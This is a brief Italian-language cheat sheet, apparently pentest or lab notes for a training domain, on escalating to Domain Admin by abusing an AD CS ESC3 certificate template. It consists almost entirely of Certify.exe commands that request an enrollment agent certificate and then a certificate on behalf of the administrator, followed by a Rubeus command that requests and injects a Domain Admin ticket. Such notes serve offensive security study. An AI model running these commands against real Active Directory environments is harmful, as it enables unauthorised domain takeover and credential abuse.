# Priv Esc - Across domain trusts - AD CS - Abusing ESC3 User to DA

* Cerca template vulnerabili

```powershell
Certify.exe find /vulnerable
```

* Escalation a Domain Admin

```powershell
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
```

* Convertire il certificato da .pem a .pfx(esc3agent.pfx) e utilizza il certificato per conto del DA utilizzando "SmartCardEnrollment-Users" template, produrra un certificato in output

```powershell
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
/template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator
/enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
```

* Convertire il certificato da pem a pfx (esc3user-DA.pfx) e richiedere un DA TGT e injectarlo

```powershell
Rubeus.exe asktgt /user:administrator /certificate:esc3user-DA.pfx
/password:SecretPass@123 /ptt
```
